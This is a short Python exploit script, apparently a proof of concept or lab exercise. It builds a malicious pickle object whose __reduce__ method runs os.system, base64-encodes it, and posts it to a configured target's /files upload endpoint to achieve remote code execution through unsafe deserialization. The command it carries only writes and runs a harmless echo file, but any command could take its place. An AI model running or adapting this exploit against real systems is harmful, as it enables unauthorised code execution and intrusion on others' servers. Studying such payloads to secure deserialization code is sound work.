from config import settings

import pickle
import base64
import os
import requests


class RCE(object):
    def __reduce__(self):
        cmd = "echo Hello World! I'm inside > payload.txt & payload.txt"
        import os
        return os.system, (cmd,)


def run_exploit(payload: bytes) -> None:
    url = f"http://{settings.TARGET_IP}:{settings.TARGET_PORT}/files"
    res = requests.post(url=url, files={"file": payload})
    if res.status_code == 200:
        print("Exploited")
    else:
        print(f"Error status code: {res.status_code}")


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    payload = base64.urlsafe_b64encode(pickled)
    run_exploit(payload=payload)

